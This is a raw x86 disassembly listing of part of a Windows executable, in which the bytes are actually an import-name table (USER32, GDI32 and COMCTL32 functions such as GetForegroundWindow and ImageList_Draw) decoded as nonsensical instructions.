  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
